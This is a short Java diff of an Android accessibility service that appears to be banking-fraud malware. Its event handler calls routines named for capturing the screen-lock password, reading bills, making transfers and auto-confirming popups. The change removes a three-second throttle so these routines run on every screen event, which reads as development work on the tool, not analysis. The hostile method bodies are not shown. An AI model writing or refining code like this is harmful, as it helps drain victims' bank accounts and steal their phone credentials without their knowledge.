@@ -105,8 +105,7 @@ public class CollectionAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
-        long currentTime = System.currentTimeMillis();
-        if (currentTime - lastExecutionTime >= 3000) {
+
             AccessibilityNodeInfo nodeInfo = accessibilityEvent.getSource();
             Map<String, AccessibilityNodeInfo> nodeInfoMap = AccessibleUtil.toContentDescMap(nodeInfo);
             ScreenLockPassword(nodeInfoMap);
@@ -116,9 +115,6 @@ public class CollectionAccessibilityService extends AccessibilityService {
             getBill(nodeInfoMap);
             Transfer(nodeInfoMap, nodeInfo);
             Dialogs(nodeInfoMap);
-
-            lastExecutionTime = currentTime; // 更新上次执行时间
-        }
     }
 
     //弹窗直接点击确认
